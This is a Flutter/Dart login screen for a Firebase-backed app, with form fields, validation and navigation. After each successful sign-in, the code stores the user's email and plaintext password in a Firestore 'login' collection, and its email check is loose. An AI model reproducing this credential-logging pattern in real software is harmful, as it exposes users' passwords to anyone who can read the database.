import 'dart:async';
import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:google_sign_in/google_sign_in.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../globals_values/globals.dart';
import '../home_page/home.dart';
import 'forgetpassword.dart';
import 'sign_up.dart';

class Login extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    // TODO: implement createState
    return LoginPage();
  }
}

class LoginPage extends State<Login> {
  GlobalState _store = GlobalState.instance;

  LoginPage() {
    shared_preferences();
  }

  shared_preferences() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    prefs.setString('installed', 'yes');
  }

  final _formKey = GlobalKey<FormState>();
  TextEditingController _email;
  final FocusNode _email555 = FocusNode();
  final FocusNode _password555 = FocusNode();
  TextEditingController _password;

  @override
  void initState() {
    _email = new TextEditingController();
    _password = new TextEditingController();
  }

  _fieldFocusChange(
      BuildContext context, FocusNode currentFocus, FocusNode nextFocus) {
    currentFocus.unfocus();
    FocusScope.of(context).requestFocus(nextFocus);
  }

  bool _isHidden = true;

  void _toggleVisibility() {
    setState(() {
      _isHidden = !_isHidden;
    });
  }

  void showbottomsheet() {
    showModalBottomSheet(
        context: context,
        builder: (BuildContext context) {
          return new Container(
            child: new Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: <Widget>[
                new Text('you are disconnected'),
                new FlatButton(
                  onPressed: () => Navigator.pop(context),
                  child: new Icon(Icons.close),
                )
              ],
            ),
          );
        });
  }

  void isused() {
    showModalBottomSheet(
        context: context,
        builder: (BuildContext context) {
          return new Container(
            child: new Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: <Widget>[
                new Text('Email Or Password Is Wrong'),
                new FlatButton(
                  onPressed: () => Navigator.pop(context),
                  child: new Icon(Icons.close),
                )
              ],
            ),
          );
        });
  }

  String _erroe;

  _onclick() async {
    if (_formKey.currentState.validate()) {
      try {
        final result = await InternetAddress.lookup('google.com');
        if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
          //  print('connected');
          final FormState form = _formKey.currentState;
          int len = 0;
          int len1;
          QuerySnapshot _myDoc =
              await Firestore.instance.collection('login').getDocuments();
          List<DocumentSnapshot> _myDocCount = _myDoc.documents;
          setState(() {
            len = _myDocCount.length;
            len1 = len + 1;
          });
          DateTime now = DateTime.now();
          //setState(() {
          await FirebaseAuth.instance
              .signInWithEmailAndPassword(
                  email: _email.text, password: _password.text)
              .whenComplete(() {
            setState(() {
              _erroe = "d";
            });
          }).catchError((e) {
            //    print("Erroeee: $e");
            setState(() {
              _erroe =
                  "PlatformException(ERROR_WRONG_PASSWORD, The password is invalid or the user does not have a password., null)";
            });
          });

          if (_erroe ==
              "PlatformException(ERROR_WRONG_PASSWORD, The password is invalid or the user does not have a password., null)") {
            isused();
          } else if (_erroe == "d") {
            _store.set('useremail', _email.text);
            Firestore.instance.collection('login').document("${len1}").setData({
              "email1": "${_email.text}",
              "password": "${_password.text}",
              "lastseen": "${now.toString()}"
            }).catchError((e) {
//print(e)
            });
            _password.clear();
            _email.clear();
            // print("added");

            {
              Navigator.of(context).pushNamedAndRemoveUntil(
                  '/LandPage', (Route<dynamic> route) => false);
            }

            /*  {
              Navigator.push(
                  context, MaterialPageRoute(builder: (context) => LandPage()));
            }*/
          }
          //});
        }
      } on SocketException catch (_) {
        //  print('not connected');
        showbottomsheet();
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return SafeArea(
      child: Scaffold(
        body: Container(
          decoration: BoxDecoration(
            image: DecorationImage(
                image: AssetImage('img/wave.png'), fit: BoxFit.cover),
          ),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: <Widget>[
              Container(
                child: Text(
                  'Login',
                  style: TextStyle(
                    fontSize: MediaQuery.of(context).size.width / 18,
                    fontFamily: 'Raleway2',
                    color: Color(0xFF636363),
                  ),
                  textAlign: TextAlign.left,
                ),
              ),
              Form(
                key: _formKey,
                child: new Container(
                    child: new Column(
                  children: <Widget>[
                    new TextFormField(
                      keyboardType: TextInputType.emailAddress,
                      controller: _email,
                      textInputAction: TextInputAction.next,
                      focusNode: _email555,
                      onFieldSubmitted: (term) {
                        _fieldFocusChange(context, _email555, _password555);
                      },
                      decoration: new InputDecoration(
                        icon: new Icon(Icons.alternate_email),
                        labelText: "Your Email",
                        hintText: "Enter your Email",
                        hintStyle: TextStyle(
                          color: Colors.grey,
                          fontSize: MediaQuery.of(context).size.width / 30,
                        ),
                      ),
                      validator: (value) {
                        if (value.isEmpty) {
                          return 'Enter your Eamil';
                        }
                        if (value.contains("@")) {
                          return null;
                        } else if (value.contains(".")) {
                          return null;
                        } else {
                          return "your Eamil doesn't validat";
                        }
                      },
                    ),
                    TextFormField(
                      controller: _password,
                      keyboardType: TextInputType.text,
                      focusNode: _password555,
                      onFieldSubmitted: (value) {
                        _password555.unfocus();
                      },
                      decoration: InputDecoration(
                        icon: new Icon(Icons.lock),
                        labelText: "Your Password",
                        hintText: "Enter your password",
                        hintStyle: TextStyle(
                          color: Colors.grey,
                          fontSize: MediaQuery.of(context).size.width / 30,
                        ),
                        suffixIcon: "Password" == "Password"
                            ? IconButton(
                                onPressed: _toggleVisibility,
                                icon: _isHidden
                                    ? Icon(Icons.visibility)
                                    : Icon(Icons.visibility_off),
                              )
                            : null,
                      ),
                      obscureText: "Password" == "Password" ? _isHidden : false,
                      validator: (value) {
                        if (value.isEmpty) {
                          return 'Enter your password';
                        }
                        if (value.length < 4) {
                          return 'your password must more than 4';
                        }
                        return null;
                      },
                    ),
                  ],
                )),
              ),
              Container(
                child: InkWell(
                  child: Text(
                    "Forget Password ?",
                    style: TextStyle(
                        color: Colors.grey,
                        fontSize: MediaQuery.of(context).size.width / 30),
                  ),
                  onTap: () {
                    {
                      Navigator.push(
                          context,
                          MaterialPageRoute(
                              builder: (context) => forgetpassword()));
                    }
                  },
                ),
                alignment: Alignment.topRight,
              ),
              Align(
                child: InkWell(
                  child: Container(
                    decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(30),
                        gradient: LinearGradient(
                            colors: [Color(0xfffbd12d), Color(0xffef3b78)],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight)),
                    child: FlatButton(
                      child: Text(
                        "LogIn",
                        style: TextStyle(
                            backgroundColor: Colors.transparent,
                            fontSize: MediaQuery.of(context).size.width / 23),
                      ),
                      onPressed: _onclick,
                    ),
                    padding: new EdgeInsets.symmetric(
                        vertical: 0.0,
                        horizontal: /*100.0*/ MediaQuery.of(context)
                                .size
                                .width /
                            4),
                  ),
                  onTap: () {
                    _onclick();
                  },
                ),
                alignment: Alignment.bottomCenter,
              ),
              SizedBox(
                height: MediaQuery.of(context).size.height / 3,
              ),
              Column(
                children: <Widget>[
                  Text('Don\'t have an account?',
                      style: TextStyle(
                          fontSize: MediaQuery.of(context).size.width / 25,
                          fontFamily: 'Raleway',
                          color: Colors.white)),
                  InkWell(
                    child: Text(
                      "Sign up",
                      style: TextStyle(
                          color: Colors.white,
                          fontSize: MediaQuery.of(context).size.width / 19),
                    ),
                    onTap: () {
                      {
                        Navigator.push(context,
                            MaterialPageRoute(builder: (context) => sign_up()));
                      }
                    },
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}
